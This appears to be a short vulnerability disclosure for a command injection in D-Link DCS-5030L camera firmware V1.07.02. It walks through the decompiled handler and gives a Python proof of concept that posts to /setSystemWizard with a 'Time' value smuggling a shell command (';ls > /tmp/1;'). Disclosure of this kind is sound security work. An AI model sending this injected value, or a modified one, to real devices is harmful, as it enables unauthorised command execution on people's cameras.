# command injection

## D-LINK DCS-5030L

version: V1.07.02

## Description:

There is a command injection in alphapd/sub_43545C

## Source:

you may download it from : [legacyfiles.us.dlink.com - /DCS-5030L/REVA/FIRMWARE/](http://legacyfiles.us.dlink.com/DCS-5030L/REVA/FIRMWARE/)

## Analyse:

![](1.png)

If v13 equal zero and v36 equal 1, get into. Look into websGetVarCheck ,we could know that it will return 0 when the keyword's value is null.

![](2.png)

If DateTimeMode's value equal '1' ,finally will call doSystem,causes command injection via parameter v38

## POC

```
url = "http://192.168.1.13/setSystemWizard"
headers = {
    'Host': '192.168.1.13',
    'Authorization': 'Basic base64(admin:password)',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}
data = {
    'ReplySuccessPage':'advanced.htm',
    'ReplyErrorPage':'errradv.htm',
    'Time':';ls > /tmp/1;',
    'DateTimeMode':'1',
    'ConfigReboot':'No'
}
r = requests.post(url, data=data,headers=headers)
```
